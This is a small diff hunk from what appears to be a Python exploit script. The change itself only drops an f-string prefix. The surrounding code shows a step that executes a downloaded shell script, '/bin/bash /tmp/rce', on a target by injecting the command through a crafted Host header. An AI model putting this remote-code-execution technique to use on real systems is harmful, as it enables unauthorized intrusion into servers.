@@ -68,7 +68,7 @@ def exploit_execute(target, session, data, username="admin"):
     """
     Step 2: Execute the downloaded shell script.
     """
-    print(f"[*] Step 2: Executing /bin/bash /tmp/rce")
+    print("[*] Step 2: Executing /bin/bash /tmp/rce")
     exec_cmd = '/bin/bash /tmp/rce'
     host_header = generate_host_header(exec_cmd)
 
